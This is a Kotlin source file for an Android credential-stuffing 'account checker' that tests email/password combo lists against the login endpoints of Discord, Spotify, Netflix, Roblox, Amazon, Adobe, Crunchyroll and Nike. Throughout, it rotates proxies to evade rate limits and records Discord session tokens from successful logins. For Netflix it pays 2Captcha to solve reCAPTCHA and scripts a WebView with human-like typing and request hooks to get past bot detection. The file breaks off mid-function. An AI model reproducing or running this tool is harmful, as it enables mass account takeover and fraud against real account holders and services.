package com.silverbullet.checker.core

import android.os.Handler
import android.os.Looper
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import com.silverbullet.checker.models.*
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.net.InetSocketAddress
import java.security.SecureRandom
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicInteger
import kotlin.coroutines.Continuation
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class AccountChecker(private val config: CheckConfig, private val webView: WebView? = null) {

    private val client = buildClient()
    private val checkedCount = AtomicInteger(0)
    private var isRunning = false
    private var job: Job? = null

    private val _results = ConcurrentLinkedQueue<Account>()
    val results: List<Account> get() = _results.toList()

    var onResult: ((Account) -> Unit)? = null
    var onStatsUpdate: ((CheckStats) -> Unit)? = null
    var onLog: ((String) -> Unit)? = null

    private fun log(msg: String) {
        onLog?.invoke(msg)
    }

    private var stats = CheckStats()
    private var proxies = mutableListOf<Proxy>()
    private var currentProxyIndex = 0

    fun loadProxies(proxyList: List<Proxy>) {
        proxies = proxyList.toMutableList()
    }

    private fun buildClient(): OkHttpClient.Builder {
        return OkHttpClient.Builder()
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .followRedirects(false)
            .followSslRedirects(false)
    }

    private fun getOkHttpClient(): OkHttpClient {
        val builder = buildClient()
        if (config.useProxy && proxies.isNotEmpty()) {
            val proxy = getNextProxy()
            if (proxy != null) {
                val okProxy = when (config.proxyType) {
                    ProxyType.HTTP -> java.net.Proxy(java.net.Proxy.Type.HTTP, InetSocketAddress(proxy.ip, proxy.port))
                    ProxyType.SOCKS4, ProxyType.SOCKS5 -> java.net.Proxy(java.net.Proxy.Type.SOCKS, InetSocketAddress(proxy.ip, proxy.port))
                }
                builder.proxy(okProxy)
            }
        }
        return builder.build()
    }

    private fun getNextProxy(): Proxy? {
        if (proxies.isEmpty()) return null
        val activeProxies = proxies.filter { it.isActive && it.failCount < 5 }
        if (activeProxies.isEmpty()) return null
        currentProxyIndex = (currentProxyIndex + 1) % activeProxies.size
        return activeProxies[currentProxyIndex]
    }

    private fun reportProxyFailure(proxy: Proxy) {
        proxy.failCount++
        if (proxy.failCount >= 5) {
            proxy.isActive = false
        }
    }

    fun startChecking(combos: List<Combo>, scope: CoroutineScope) {
        if (isRunning) return
        isRunning = true
        stats.reset()
        stats.total = combos.size

        val semaphore = java.util.concurrent.Semaphore(config.threads)
        val comboQueue = ConcurrentLinkedQueue(combos)

        job = scope.launch(Dispatchers.IO) {
            val workers = (1..config.threads).map { workerId ->
                async {
                    while (isRunning && comboQueue.isNotEmpty()) {
                        val combo = comboQueue.poll() ?: break
                        semaphore.acquire()
                        try {
                            val result = checkAccount(combo)
                            _results.add(result)
                            stats.checked++
                            updateStats(result)
                            onResult?.invoke(result)
                        } finally {
                            semaphore.release()
                        }
                    }
                }
            }
            workers.awaitAll()
            isRunning = false
stats.cpm = stats.computeCpm()
            onStatsUpdate?.invoke(stats)
        }
    }

    fun stopChecking() {
        isRunning = false
        job?.cancel()
    }

    private suspend fun checkAccount(combo: Combo): Account {
        var lastError: Exception? = null
        var attempt = 0
        val maxAttempts = config.retries + 1

        while (attempt < maxAttempts) {
            attempt++
            try {
                return when (config.module) {
                    CheckModule.DISCORD -> checkDiscord(combo)
                    CheckModule.SPOTIFY -> checkSpotify(combo)
                    CheckModule.NETFLIX -> checkNetflix(combo)
                    CheckModule.GENERIC -> checkGeneric(combo)
                    CheckModule.ROBLOX -> checkRoblox(combo)
                    CheckModule.AMAZON -> checkAmazon(combo)
                    CheckModule.ADOBE -> checkAdobe(combo)
                    CheckModule.CRUNCHYROLL -> checkCrunchyroll(combo)
                    CheckModule.NIKE -> checkNike(combo)
                    CheckModule.CUSTOM -> checkCustom(combo)
                }
            } catch (e: Exception) {
                lastError = e
                attempt++
                if (attempt < maxAttempts) delay(1000)
            }
        }

        return Account(
            email = combo.email,
            password = combo.password,
            status = AccountStatus.ERROR,
            details = lastError?.message ?: "Unknown error"
        )
    }

    private suspend fun checkDiscord(combo: Combo): Account = suspendCoroutine { cont ->
        val json = """{"login":"${combo.email}","password":"${combo.password}","undelete":false,"login_source":"null","gift_code_sku_id":"null"}"""
        val body = json.toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("https://discord.com/api/v9/auth/login")
            .post(body)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Content-Type", "application/json")
            .header("Origin", "https://discord.com")
            .header("Referer", "https://discord.com/login")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when (response.code) {
                    200 -> {
                        val token = try {
                            org.json.JSONObject(bodyStr).optString("token", "")
                        } catch (e: Exception) { "" }

                        if (token.isNotEmpty()) {
                            AccountStatus.HIT
                        } else {
                            AccountStatus.CAPTCHA
                        }
                    }
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    403 -> AccountStatus.CAPTCHA
                    500, 502, 503 -> AccountStatus.RETRY
                    else -> AccountStatus.ERROR
                }

                val details = when (status) {
                    AccountStatus.HIT -> {
                        try {
                            val json = org.json.JSONObject(bodyStr)
                            val token = json.optString("token", "")
                            "Token: ${token.take(50)}..."
                        } catch (e: Exception) { "Hit - token captured" }
                    }
                    AccountStatus.FAIL -> "Invalid credentials"
                    AccountStatus.BAN -> "Rate limited / IP banned"
                    AccountStatus.CAPTCHA -> "CAPTCHA / Phone verification"
                    else -> "HTTP ${response.code}"
                }

                cont.resume(createResult(combo, status, details))
            }
        })
    }

    private suspend fun checkSpotify(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("type", "sp ldap")
            .add("remember", "true")
            .add("countryCode", "US")
            .build()

        val auth = android.util.Base64.encodeToString(
            "${combo.email}:${combo.password}".toByteArray(),
            android.util.Base64.NO_WRAP
        )

        val request = Request.Builder()
            .url("https://accounts.spotify.com/api/login")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Authorization", "Basic $auth")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when {
                    response.code == 200 && !bodyStr.contains("INVALID_CREDENTIALS") -> AccountStatus.HIT
                    response.code == 429 -> AccountStatus.BAN
                    response.code == 401 -> AccountStatus.FAIL
                    bodyStr.contains("INVALID_CREDENTIALS") -> AccountStatus.FAIL
                    bodyStr.contains("CAPTCHA") -> AccountStatus.CAPTCHA
                    else -> AccountStatus.ERROR
                }

                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkGeneric(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url(config.module.endpoint)
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401, 403 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private val netflixWebViewLock = Mutex()

    private suspend fun checkNetflix(combo: Combo): Account {
        return if (config.twoCaptchaKey.isNotBlank()) {
            checkNetflixClcs(combo)
        } else if (webView != null) {
            checkNetflixWebView(combo)
        } else {
            createResult(combo, AccountStatus.CAPTCHA, "Netflix: no 2Captcha key and no built-in browser available")
        }
    }

    private suspend fun checkNetflixClcs(combo: Combo): Account = suspendCoroutine { cont ->
        val client = getOkHttpClient()
        val flwssn = UUID.randomUUID().toString()

        val gqlHeaders = mapOf(
            "User-Agent" to "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Content-Type" to "application/json",
            "Origin" to "https://www.netflix.com",
            "Referer" to "https://www.netflix.com/login",
            "x-netflix.request.id" to randomHexString(32),
            "x-netflix.context.ui-flavor" to "akira",
            "x-netflix.context.locales" to "en-US"
        )

        if (config.twoCaptchaKey.isBlank()) {
            cont.resume(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA required - enter a 2Captcha API key in Settings"))
            return@suspendCoroutine
        }

        val initPayload = JSONObject()
            .put("operationName", "CLCSHookV2")
            .put("variables", JSONObject()
                .put("locale", "en-US")
                .put("flowName", "loginWeb")
                .put("parameters", JSONArray()
                    .put(nfField("growthAction", "INITIATE_USER_JOURNEY"))
                    .put(nfField("fromTv", false))
                    .put(nfField("flwssn", flwssn))))
            .put("extensions", persistedQuery("f6ece376-afc6-4dc8-a847-c6351cd71876"))
            .toString()

        netflixGqlPost(client, gqlHeaders, initPayload) { initBody, initCode ->
            if (!netflixHandleHttp(combo, cont, initCode)) return@netflixGqlPost
            log("Netflix(api): CLCS init HTTP $initCode")

            val serverState = nfDeepFind(initBody, "serverState")
            val serverScreenUpdate = nfDeepFind(initBody, "serverScreenUpdate")
            if (serverState.isNullOrEmpty() || serverScreenUpdate.isNullOrEmpty()) {
                log("Netflix(api): could not init session (state=${serverState != null} ssu=${serverScreenUpdate != null})")
                cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: could not init session"))
                return@netflixGqlPost
            }

            solveTwoCaptchaV3(client) { token ->
                if (token == null) {
                    log("Netflix(api): 2captcha failed to return token")
                    cont.resume(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA solve failed"))
                    return@solveTwoCaptchaV3
                }
                log("Netflix(api): 2captcha token received")

                val updatePayload = JSONObject()
                    .put("operationName", "CLCSScreenUpdate")
                    .put("variables", JSONObject()
                        .put("format", "HTML")
                        .put("imageFormat", "PNG")
                        .put("locale", "en-US")
                        .put("serverState", serverState)
                        .put("serverScreenUpdate", serverScreenUpdate)
                        .put("inputFields", JSONArray()
                            .put(nfField("userLoginId", combo.email))
                            .put(nfField("password", combo.password))
                            .put(nfField("countryCode", "US"))
                            .put(nfField("countryIsoCode", "US"))
                            .put(nfField("recaptchaError", ""))
                            .put(nfIntField("recaptchaResponseTime", -1))
                            .put(nfField("recaptchaResponseToken", token))))
                    .put("extensions", persistedQuery("6787cd3c-511a-455e-8aa8-8b44cd8cf453"))
                    .toString()

                netflixGqlPost(client, gqlHeaders, updatePayload) { updateBody, updateCode ->
                    if (!netflixHandleHttp(combo, cont, updateCode)) return@netflixGqlPost
                    val text = updateBody ?: ""
                    val lower = text.lowercase()

                    val status: AccountStatus
                    val details: String
                    when {
                        lower.contains("something went wrong") || lower.contains("captcha") || lower.contains("recaptcha") -> {
                            status = AccountStatus.CAPTCHA
                            details = "Netflix: blocked or reCAPTCHA rejected"
                        }
                        lower.contains("incorrect password") || lower.contains("doesn.t match") ||
                            lower.contains("no account found") || lower.contains("not associated") -> {
                            status = AccountStatus.FAIL
                            details = "Wrong Netflix credentials"
                        }
                        text.contains("CLCSNavigate") || text.contains("loggedInUser") ||
                            (text.contains("navigationMarker") && text.contains("BROWSE")) -> {
                            status = AccountStatus.HIT
                            details = "Valid Netflix account (logged in)"
                        }
                        else -> {
                            status = AccountStatus.ERROR
                            details = "Netflix: unexpected response"
                        }
                    }
                    log("Netflix(api): login HTTP $updateCode -> ${status.name}")
                    cont.resume(createResult(combo, status, details))
                }
            }
        }
    }

    private fun persistedQuery(id: String): JSONObject = JSONObject()
        .put("persistedQuery", JSONObject().put("version", 102).put("id", id))

    private fun nfField(name: String, value: String): JSONObject = JSONObject()
        .put("name", name).put("value", JSONObject().put("stringValue", value))

    private fun nfField(name: String, value: Boolean): JSONObject = JSONObject()
        .put("name", name).put("value", JSONObject().put("booleanValue", value))

    private fun nfIntField(name: String, value: Int): JSONObject = JSONObject()
        .put("name", name).put("value", JSONObject().put("intValue", value))

    private fun nfDeepFind(json: Any?, key: String): String? {
        if (json == null) return null
        return when (json) {
            is JSONObject -> {
                if (json.has(key)) {
                    val v = json.opt(key)
                    if (v is String && v.isNotEmpty()) v else null
                } else {
                    val it = json.keys()
                    while (it.hasNext()) {
                        val child = nfDeepFind(json.opt(it.next()), key)
                        if (child != null) return child
                    }
                    null
                }
            }
            is JSONArray -> {
                for (i in 0 until json.length()) {
                    val child = nfDeepFind(json.opt(i), key)
                    if (child != null) return child
                }
                null
            }
            else -> null
        }
    }

    private fun randomHexString(len: Int): String {
        val chars = "0123456789abcdef"
        val rnd = SecureRandom()
        return buildString { repeat(len) { append(chars[rnd.nextInt(chars.length)]) } }
    }

    private fun netflixGqlPost(client: OkHttpClient, headers: Map<String, String>, payload: String, cb: (String?, Int) -> Unit) {
        val builder = Request.Builder()
            .url("https://web.prod.cloud.netflix.com/graphql")
            .post(payload.toRequestBody("application/json".toMediaType()))
        for ((k, v) in headers) builder.header(k, v)
        client.newCall(builder.build()).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) { cb(null, 0) }
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                val code = response.code
                response.close()
                cb(body, code)
            }
        })
    }

    private fun netflixHandleHttp(combo: Combo, cont: Continuation<Account>, code: Int): Boolean {
        return when {
            code == 200 -> true
            code == 429 -> { cont.resume(createResult(combo, AccountStatus.BAN, "Netflix: HTTP $code")); false }
            code == 401 || code == 403 -> { cont.resume(createResult(combo, AccountStatus.FAIL, "Netflix: HTTP $code")); false }
            code == 0 -> { cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: Connection failed")); false }
            else -> { cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: HTTP $code")); false }
        }
    }

    private fun solveTwoCaptchaV3(client: OkHttpClient, cb: (String?) -> Unit) {
        val siteKey = "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"
        val form = FormBody.Builder()
            .add("key", config.twoCaptchaKey)
            .add("method", "userrecaptcha")
            .add("version", "v3")
            .add("action", "netflix_login")
            .add("min_score", "0.3")
            .add("pageurl", "https://www.netflix.com/login")
            .add("googlekey", siteKey)
            .add("json", "1")
            .build()
        val submit = Request.Builder()
            .url("https://2captcha.com/in.php")
            .post(form)
            .build()
        client.newCall(submit).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) { cb(null) }
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                response.close()
                val reqId = runCatching { JSONObject(body).optString("request", "").takeIf { it.isNotBlank() } }.getOrNull()
                if (reqId.isNullOrBlank()) { cb(null); return }
                pollTwoCaptchaV3(client, reqId, 0, cb)
            }
        })
    }

    private fun pollTwoCaptchaV3(client: OkHttpClient, id: String, attempt: Int, cb: (String?) -> Unit) {
        val url = "https://2captcha.com/res.php?key=${config.twoCaptchaKey}&action=get&json=1&id=$id"
        val request = Request.Builder().url(url).get().build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) { cb(null) }
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                response.close()
                val res = runCatching { JSONObject(body) }.getOrNull()
                val status = res?.optInt("status", 0) ?: 0
                if (status == 1) {
                    cb(res?.optString("request")?.takeIf { it.isNotBlank() && !it.startsWith("ERROR") } ?: null)
                } else if (attempt < 36) {
                    Thread.sleep(5000)
                    pollTwoCaptchaV3(client, id, attempt + 1, cb)
                } else {
                    cb(null)
                }
            }
        })
    }

    private suspend fun checkNetflixWebView(combo: Combo): Account = netflixWebViewLock.withLock {
        return withContext(Dispatchers.Main) {
            suspendCoroutine { cont ->
                val wv = webView ?: run {
                    log("Netflix(browser): no WebView available")
                    cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: WebView unavailable"))
                    return@suspendCoroutine
                }
                var settled = false
                val startedAt = System.currentTimeMillis()
                val timeoutMs = 95000L
                val handler = Handler(Looper.getMainLooper())
                var lastLogState = ""
                var fillInjectedAt = startedAt
                var fillCount = 0
                var submittedAt = 0L
                var lastTokLogged = ""

                fun settle(acc: Account) {
                    if (settled) return
                    settled = true
                    handler.removeCallbacksAndMessages(null)
                    try {
                        CookieManager.getInstance().removeAllCookies(null)
                        wv.stopLoading()
                    } catch (_: Exception) {}
                    log("Netflix(browser): RESULT ${acc.status.name} | ${acc.details} | ${combo.email}")
                    cont.resume(acc)
                }

                fun injectFill() {
                    fillInjectedAt = System.currentTimeMillis()
                    fillCount++
                    log("Netflix(browser): injecting credentials into form (attempt #$fillCount)")
                    fillNetflixLogin(wv, combo)
                }

                fun pollResult() {
                    if (settled) return
                    val js = """(function(){var u=location.href;var tt=document.title||'';var b='';try{b=document.body?document.body.innerText||'':'';}catch(x){}var t=b.slice(-1200).replace(/\s+/g,' ');var err=!!(document.querySelector('[data-uia="alert-error"]')||document.querySelector('[data-uia="field-error"]')||document.querySelector('.hasError'));var cap=!!document.querySelector('iframe[src*="recaptcha"]');var sb='';try{sb=window.__sb_screen_body||'';}catch(e){}var fs=(window.__silverbullet||'');return JSON.stringify({u:u,tt:tt,t:t,err:err,cap:cap,fs:fs,sb:sb});})()"""
                    wv.evaluateJavascript(js) { raw ->
                        if (settled) return@evaluateJavascript
                        val data = try {
                            JSONObject(JSONObject("{\"v\":" + raw + "}").getString("v"))
                        } catch (e: Exception) { null }

                        val url = data?.optString("u", "") ?: ""
                        val title = data?.optString("tt", "") ?: ""
                        val fs = data?.optString("fs", "") ?: ""
                        val err = data?.optBoolean("err", false) == true
                        val cap = data?.optBoolean("cap", false) == true
                        val snippet = (data?.optString("t", "") ?: "").take(140)
                        val elapsed = System.currentTimeMillis() - startedAt
                        val bodyText = (data?.optString("t", "") ?: "").lowercase()
                        val sb = data?.optString("sb", "") ?: ""
                        val tok = sb.contains("\"recaptchaResponseToken\":\"") && !sb.contains("\"recaptchaResponseToken\":\"\"")
                        if (sb.isNotEmpty() && lastTokLogged != "$tok") {
                            lastTokLogged = "$tok"
                            log("Netflix(browser): GraphQL ScreenUpdate captured, recaptchaTokenPresent=$tok len=${sb.length}")
                        }

                        val stateKey = "u=$url|fs=$fs|err=$err"
                        if (stateKey != lastLogState) {
                            lastLogState = stateKey
                            log("Netflix(browser): url=${url.take(60)}... | title=${title.take(50)} | fill=$fs | err=$err | cap=$cap | body=$snippet")
                        }

                        if (fs == "submitted" && submittedAt == 0L) {
                            submittedAt = System.currentTimeMillis()
                            log("Netflix(browser): form submitted, waiting for server response")
                        }
                        val sinceSubmit = if (submittedAt > 0) System.currentTimeMillis() - submittedAt else 0L
                        val canRetry = fillCount < 3 && System.currentTimeMillis() - fillInjectedAt > 12000
                        val textErr = bodyText.contains("incorrect password") || bodyText.contains("doesn.t match") ||
                            bodyText.contains("does not match") || bodyText.contains("no account found") ||
                            bodyText.contains("not associated") || bodyText.contains("invalid password") ||
                            bodyText.contains("enter a valid email") || bodyText.contains("haven.t found")

                        when {
                            url.contains("/browse") || url.contains("YourAccount") || url.contains("profiles") -> {
                                settle(createResult(combo, AccountStatus.HIT, "Valid Netflix account"))
                            }
                            err || textErr -> {
                                val blocked = bodyText.contains("try again") || bodyText.contains("in a few minutes") ||
                                    bodyText.contains("captcha") || bodyText.contains("recaptcha") || bodyText.contains("too many attempts")
                                settle(createResult(combo, if (blocked) AccountStatus.CAPTCHA else AccountStatus.FAIL,
                                    if (blocked) "Netflix: blocked by reCAPTCHA" else "Wrong Netflix credentials"))
                            }
                            submittedAt > 0 && sinceSubmit > 30000 -> {
                                val challenge = cap && (bodyText.contains("robot") || bodyText.contains("verify") ||
                                    bodyText.contains("human") || bodyText.contains("challenge") || bodyText.contains("isn't you"))
                                when {
                                    challenge -> settle(createResult(combo, AccountStatus.CAPTCHA, "Netflix: reCAPTCHA challenge shown"))
                                    canRetry -> {
                                        log("Netflix(browser): no result ${sinceSubmit/1000}s after submit, re-injecting")
                                        injectFill()
                                        handler.postDelayed({ pollResult() }, 1500)
                                    }
                                    else -> settle(createResult(combo, AccountStatus.ERROR,
                                        "Netflix: no response after submit url=${url.take(80)}"))
                                }
                            }
                            (fs.isEmpty() || fs == "no_fields") && canRetry -> {
                                log("Netflix(browser): login form not ready, retrying fill")
                                injectFill()
                                handler.postDelayed({ pollResult() }, 1500)
                            }
                            elapsed > timeoutMs -> {
                                settle(createResult(combo, AccountStatus.ERROR,
                                    "Netflix: browser timeout url=${url.take(80)} fill=$fs"))
                            }
                            else -> handler.postDelayed({ pollResult() }, 1200)
                        }
                    }
                }

                try {
                    CookieManager.getInstance().removeAllCookies(null)
                    wv.settings.javaScriptEnabled = true
                    wv.settings.domStorageEnabled = true
                    wv.settings.databaseEnabled = true
                    wv.settings.userAgentString =
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                    wv.webViewClient = object : WebViewClient() {
                        override fun onPageStarted(view: WebView?, url: String?) {
                            if (settled) return
                            val hookJs = "(function(){if(window.__sb_hooked)return;window.__sb_hooked=true;" +
                                "var o=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){" +
                                "try{if(typeof b==='string'&&b.indexOf('CLCSScreenUpdate')>-1){window.__sb_screen_body=b;}}catch(e){}" +
                                "return o.apply(this,arguments);};" +
                                "var f=window.fetch;window.fetch=function(){" +
                                "try{var a=arguments;var body=a[1]&&a[1].body;if(typeof body==='string'&&body.indexOf('CLCSScreenUpdate')>-1){window.__sb_screen_body=body;}}catch(e){}" +
                                "return f.apply(this,arguments);};})()"
                            view?.evaluateJavascript(hookJs, null)
                        }

                        override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                            if (!settled) log("Netflix(browser): nav=${request?.url}")
                            return false
                        }

                        override fun onPageFinished(view: WebView?, url: String?) {
                            if (settled) return
                            log("Netflix(browser): page finished url=${url?.take(70)}")
                            handler.postDelayed({
                                if (settled) return@postDelayed
                                injectFill()
                            }, 1500)
                        }

                        override fun onReceivedHttpError(
                            view: WebView?,
                            request: android.webkit.WebResourceRequest?,
                            errorResponse: android.webkit.WebResourceResponse?
                        ) {
                            val code = errorResponse?.statusCode ?: -1
                            log("Netflix(browser): http error $code url=${request?.url}")
                        }
                    }
                    log("Netflix(browser): loading login page for ${combo.email}")
                    wv.loadUrl("https://www.netflix.com/login?locale=en-US")
                    handler.postDelayed({ pollResult() }, 7000)
                } catch (e: Exception) {
                    log("Netflix(browser): WebView init failed: ${e.message}")
                    settle(createResult(combo, AccountStatus.ERROR, "Netflix: WebView failed: ${e.message}"))
                }
            }
        }
    }

    private fun fillNetflixLogin(view: WebView, combo: Combo) {
        val email = JSONObject.quote(combo.email)
        val pass = JSONObject.quote(combo.password)
        val js = """(function(){
try{
var EMAIL=%EMAIL%;var PASS=%PASS%;var started=false;
function setVal(el,v){var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set;s.call(el,v);el.dispatchEvent(new Event('input',{bubbles:true}));}
function typeText(el,text,done){var i=0;var t=setInterval(function(){if(i>=text.length){clearInterval(t);el.dispatchEvent(new Event('change',{bubbles:true}));done();return;}i++;setVal(el,text.slice(0,i));el.dispatchEvent(new Event('keyup',{bubbles:true}));},55+Math.floor(Math.random()*45));}
function fields(){var u=document.querySelector('#id_userLoginId')||document.querySelector('input[name="userLoginId"]')||document.querySelector('input[type="email"]');var p=document.querySelector('#id_password')||document.querySelector('input[type="password"]');return (u&&p)?{u:u,p:p}:null;}
function clickBtn(){var b=document.querySelector('[data-uia="login-submit-button"]')||document.querySelector('button[type="submit"]')||document.querySelector('[data-uia="primary-action"]');if(!b){window.__silverbullet='no_button';return;}try{window.scrollTo(0,window.innerHeight*0.3);window.scrollTo(0,0);}catch(e){}
['pointerdown','mousedown','pointerup','mouseup','click'].forEach(function(t){b.dispatchEvent(new MouseEvent(t,{bubbles:true,cancelable:true,view:window}));});
window.__silverbullet='submitted';}
function waitCap(){var n=0;var t=setInterval(function(){n++;if(window.grecaptcha||document.querySelector('iframe[src*="recaptcha"]')||n>55){clearInterval(t);setTimeout(clickBtn,350+Math.floor(Math.random()*400));}},200);}
function go(){var f=fields();if(!f){window.__silverbullet='no_fields';return;}
if(f.u.value&&f.p.value){waitCap();return;}
window.__silverbullet='fields_found';
typeText(f.u,EMAIL,function(){typeText(f.p,PASS,function(){waitCap();});});}
var w=setInterval(function(){
if(document.querySelector('[data-uia="alert-error"],[data-uia="field-error"],.hasError')){window.__silverbullet='error_visible';clearInterval(w);return;}
if(!started&&fields()){started=true;clearInterval(w);go();}
},250);
setTimeout(function(){if(!started){window.__silverbullet='no_fields';}},15000);
}catch(e){window.__silverbullet='fill_js_err';}
})()"""
        view.evaluateJavascript(
            js.replace("%EMAIL%", email).replace("%PASS%", pass), null
        )
    }

    private suspend fun checkRoblox(combo: Combo): Account = suspendCoroutine { cont ->
        val json = """{"ctype":"Email","cvalue":"${combo.email}","password":"${combo.password}"}"""
        val body = json.toRequestBody("application/json".toMediaType())

        val request = Request.Builder()
            .url("https://auth.roblox.com/v2/login")
            .post(body)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .header("Content-Type", "application/json")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                val bodyStr = response.body?.string() ?: ""
                response.close()

                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    403 -> AccountStatus.CAPTCHA
                    else -> AccountStatus.ERROR
                }

                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkAmazon(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("email", combo.email)
            .add("password", combo.password)
            .build()

        val request = Request.Builder()
            .url("https://www.amazon.com/ap/signin")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when {
                    response.code == 200 && response.header("Location")?.contains("signin") != true -> AccountStatus.HIT
                    response.code == 429 -> AccountStatus.BAN
                    response.code == 200 -> AccountStatus.FAIL
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkAdobe(combo: Combo): Account = suspendCoroutine { cont ->
        val formBody = FormBody.Builder()
            .add("username", combo.email)
            .add("password", combo.password)
            .build()

        val request = Request.Builder()
            .url("https://ims-na1.adobelogin.com/ims/profile/v1/web")
            .post(formBody)
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    401, 403 -> AccountStatus.FAIL
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkCrunchyroll(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url("https://www.crunchyroll.com/login")
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
                val status = when (response.code) {
                    200 -> AccountStatus.HIT
                    429 -> AccountStatus.BAN
                    else -> AccountStatus.ERROR
                }
                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
            }
        })
    }

    private suspend fun checkNike(combo: Combo): Account = suspendCoroutine { cont ->
        val request = Request.Builder()
            .url("https://api.nike.com/member/profile")
            .get()
            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()

        getOkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
